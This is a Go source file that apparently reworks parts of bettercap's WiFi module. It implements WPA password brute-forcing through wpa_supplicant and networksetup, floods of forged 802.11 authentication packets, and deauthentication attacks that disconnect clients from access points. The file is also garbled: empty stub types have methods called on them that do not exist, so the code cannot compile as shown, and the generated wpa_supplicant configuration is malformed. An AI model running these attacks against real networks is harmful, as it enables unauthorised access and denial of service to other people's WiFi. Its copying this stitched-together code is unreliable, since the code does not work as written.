package main

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/bettercap/bettercap/v2/core"
	"github.com/bettercap/bettercap/v2/network"
	"github.com/bettercap/bettercap/v2/packets"
	"github.com/evilsocket/islazy/async"
	"github.com/evilsocket/islazy/str"
	"github.com/evilsocket/islazy/tui"
)

type bruteforceJob struct {
	iface    string
	essid    string
	password string
	timeout  time.Duration
}

type WiFiModule struct {
	apRunning     bool
	apConfig      apConfig
	writes        writes
	Session       Session
	handle        handle
	deauthSkip    []net.HardwareAddr
	csaSilent     bool
	deauthSilent  bool
	deauthOpen    bool
	deauthAcquired bool
}

type apConfig struct {
	SSID      string
	BSSID     net.HardwareAddr
	Channel   int
	Encryption bool
}

type writes struct {}

type Session struct {
	WiFi WiFi
}

type WiFi struct {}

type handle struct {}

func (mod *WiFiModule) Debug(format string, a ...interface{}) {
	fmt.Printf(format, a...)
}

func (mod *WiFiModule) Warning(format string, a ...interface{}) {
	fmt.Printf(format, a...)
}

func (mod *WiFiModule) Error(format string, a ...interface{}) {
	fmt.Printf(format, a...)
}

func (mod *WiFiModule) Info(format string, a ...interface{}) {
	fmt.Printf(format, a...)
}

func (mod *WiFiModule) BoolParam(param string) (error, bool) {
	return nil, false
}

func (mod *WiFiModule) StringParam(param string) (error, string) {
	return nil, ""
}

func (mod *WiFiModule) IntParam(param string) (error, int) {
	return nil, 0
}

func (mod *WiFiModule) Running() bool {
	return false
}

func (mod *WiFiModule) Configure() error {
	return nil
}

func (mod *WiFiModule) injectPacket(pkt []byte) {}

func (mod *WiFiModule) onChannel(channel int, fn func()) {}

func (mod *WiFiModule) List() []*network.AccessPoint {
	return nil
}

func (mod *WiFiModule) Clear() {}

func (mod *WiFiModule) Get(bssid string) (*network.AccessPoint, bool) {
	return nil, false
}

func (mod *WiFiModule) GetClient(mac string) (*network.Station, bool) {
	return nil, false
}

func wifiBruteforceDarwin(mod *WiFiModule, job bruteforceJob) (bool, error) {
	networksetup, err := exec.LookPath("networksetup")
	if err != nil {
		return false, errors.New("could not find networksetup in $PATH")
	}

	args := []string{
		"-setairportnetwork",
		job.iface,
		job.essid,
		job.password,
	}

	type result struct {
		auth bool
		err  error
	}

	if res, err := async.WithTimeout(job.timeout, func() interface{} {
		start := time.Now()
		if output, err := core.Exec(networksetup, args); err != nil {
			return result{auth: false, err: err}
		} else {
			mod.Debug("%s %v : %v\n%v", networksetup, args, time.Since(start), output)
			return result{auth: output == "", err: nil}
		}
	}); err == nil && res != nil {
		return res.(result).auth, res.(result).err
	}

	return false, nil
}

func wifiBruteforceLinux(mod *WiFiModule, job bruteforceJob) (bool, error) {
	wpa_supplicant, err := exec.LookPath("wpa_supplicant")
	if err != nil {
		return false, errors.New("could not find wpa_supplicant in $PATH")
	}

	config := fmt.Sprintf(`p2p_disabled=1 \n\tnetwork={\n\t\tssid=%s\n\t\tpsk=%s\n\t}`, strconv.Quote(job.essid), strconv.Quote(job.password))

	file, err := os.CreateTemp("", "bettercap-wpa-config")
	if err != nil {
		return false, fmt.Errorf("could not create temporary configuration file: %v", err)
	}
	defer os.Remove(file.Name())

	if _, err := file.WriteString(config); err != nil {
		return false, fmt.Errorf("could not write temporary configuration file: %v", err)
	}

	mod.Debug("using %s ...", file.Name())

	args := []string{
		"-i",
		job.iface,
		"-c",
		file.Name(),
	}
	cmd := exec.Command(wpa_supplicant, args...)
	cmdReader, err := cmd.StdoutPipe()
	if err != nil {
		return false, err
	}

	scanner := bufio.NewScanner(cmdReader)
	done := make(chan bool)
	go func() {
		auth := false
		for scanner.Scan() {
			line := strings.ToLower(str.Trim(scanner.Text()))
			if strings.Contains(line, "handshake failed") {
				mod.Debug("%s", tui.Red(line))
				break
			} else if strings.Contains(line, "key negotiation completed") {
				mod.Debug("%s", tui.Bold(tui.Green(line)))
				auth = true
				break
			} else {
				mod.Debug("%s", tui.Dim(line))
			}
		}
		if auth {
			mod.Debug("success: %v", job)
		}
		done <- auth
	}()

	if err := cmd.Start(); err != nil {
		return false, err
	}

	timeout := time.After(job.timeout)
	doneInTime := make(chan bool)
	go func() {
		doneInTime <- <-done
	}()

	select {
	case <-timeout:
		mod.Debug("%s timeout", job.password)
		cmd.Process.Kill()
		return false, nil
	case res := <-doneInTime:
		mod.Debug("%s=%v", job.password, res)
		cmd.Process.Kill()
		return res, nil
	}
}

func (mod *WiFiModule) isFakeAuthSilent() bool {
	if err, is := mod.BoolParam("wifi.fake_auth.silent"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.csaSilent = is
	}
	return mod.csaSilent
}

func (mod *WiFiModule) sendFakeAuthPacket(bssid, client net.HardwareAddr) {
	err, pkt := packets.NewDot11Auth(client, bssid, 0)
	if err != nil {
		mod.Error("could not create authentication packet: %s", err)
		return
	}
	for i := 0; i < 32; i++ {
		mod.injectPacket(pkt)
	}
}

func (mod *WiFiModule) startFakeAuth(bssid, client net.HardwareAddr) error {
	if !mod.Running() {
		if err := mod.Configure(); err != nil {
			return err
		}
		defer mod.handle.Close()
	}

	var ap *network.AccessPoint = nil

	for _, _ap := range mod.Session.WiFi.List() {
		if bytes.Equal(_ap.HW, bssid) {
			ap = _ap
		}
	}

	if ap == nil {
		return fmt.Errorf("%s is an unknown BSSID", bssid.String())
	}

	mod.writes.Add(1)
	go func() {
		defer mod.writes.Done()

		if mod.Running() {
			logger := mod.Info
			if mod.isFakeAuthSilent() {
				logger = mod.Debug
			}
			logger("fake authentication attack in AP: %s client: %s", ap.ESSID(), client.String())
			mod.onChannel(ap.Channel, func() {
				mod.sendFakeAuthPacket(bssid, client)
			})
		}
	}()
	return nil
}

func (mod *WiFiModule) sendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {
	for seq := uint16(0); seq < 64 && mod.Running(); seq++ {
		if err, pkt := packets.NewDot11Deauth(ap, client, ap, seq); err != nil {
			mod.Error("could not create deauth packet: %s", err)
			continue
		} else {
			mod.injectPacket(pkt)
		}

		if err, pkt := packets.NewDot11Deauth(client, ap, ap, seq); err != nil {
			mod.Error("could not create deauth packet: %s", err)
			continue
		} else {
			mod.injectPacket(pkt)
		}
	}
}

func (mod *WiFiModule) skipDeauth(to net.HardwareAddr) bool {
	for _, mac := range mod.deauthSkip {
		if bytes.Equal(to, mac) {
			return true
		}
	}
	return false
}

func (mod *WiFiModule) isDeauthSilent() bool {
	if err, is := mod.BoolParam("wifi.deauth.silent"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.deauthSilent = is
	}
	return mod.deauthSilent
}

func (mod *WiFiModule) doDeauthOpen() bool {
	if err, is := mod.BoolParam("wifi.deauth.open"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.deauthOpen = is
	}
	return mod.deauthOpen
}

func (mod *WiFiModule) doDeauthAcquired() bool {
	if err, is := mod.BoolParam("wifi.deauth.acquired"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.deauthAcquired = is
	}
	return mod.deauthAcquired
}

func (mod *WiFiModule) startDeauth(to net.HardwareAddr) error {
	if err, deauthSkip := mod.StringParam("wifi.deauth.skip"); err != nil {
		return err
	} else if macs, err := network.ParseMACs(deauthSkip); err != nil {
		return err
	} else {
		mod.deauthSkip = macs
	}

	if !mod.Running() {
		if err := mod.Configure(); err != nil {
			return err
		}
		defer mod.handle.Close()
	}

	type flow struct {
		Ap     *network.AccessPoint
		Client *network.Station
	}

	toDeauth := make([]flow, 0)
	isBcast := network.IsBroadcastMac(to)
	for _, ap := range mod.Session.WiFi.List() {
		isAP := bytes.Equal(ap.HW, to)
		for _, client := range ap.Clients() {
			if isBcast || isAP || bytes.Equal(client.HW, to) {
				if !mod.skipDeauth(ap.HW) && !mod.skipDeauth(client.HW) {
					toDeauth = append(toDeauth, flow{Ap: ap, Client: client})
				} else {
					mod.Debug("skipping ap:%v client:%v because skip list %v", ap, client, mod.deauthSkip)
				}
			}
		}
	}

	if len(toDeauth) == 0 {
		if isBcast {
			return nil
		}
		return fmt.Errorf("%s is an unknown BSSID, is in the deauth skip list, or doesn't have detected clients.", to.String())
	}

	mod.writes.Add(1)
	go func() {
		defer mod.writes.Done()

		for _, deauth := range toDeauth {
			client := deauth.Client
			ap := deauth.Ap
			if mod.Running() {
				logger := mod.Info
				if mod.isDeauthSilent() {
					logger = mod.Debug
				}

				if ap.IsOpen() && !mod.doDeauthOpen() {
					mod.Debug("skipping deauth for open network %s (wifi.deauth.open is false)", ap.ESSID())
				} else if ap.HasKeyMaterial() && !mod.doDeauthAcquired() {
					mod.Debug("skipping deauth for AP %s (key material already acquired)", ap.ESSID())
				} else {
					logger("deauthing client %s from AP %s (channel:%d encryption:%s)", client.String(), ap.ESSID(), ap.Channel, ap.Encryption)
					mod.onChannel(ap.Channel, func() {
						mod.sendDeauthPacket(ap.HW, client.HW)
					})
				}
			}
		}
	}()

	return nil
}

func main() {
	// Example usage of the functions.
	mod := &WiFiModule{}
	job := bruteforceJob{
		iface:    "wlan0",
		essid:    "exampleSSID",
		password: "examplePassword",
		timeout:  10 * time.Second,
	}

	// Uncomment the function you want to test.
	// _, err := wifiBruteforceDarwin(mod, job)
	// _, err := wifiBruteforceLinux(mod, job)
	// err := mod.startFakeAuth(net.HardwareAddr{}, net.HardwareAddr{})
	// err := mod.startDeauth(net.HardwareAddr{})
	// if err != nil {
	// 	fmt.Println("Error:", err)
	// }
}
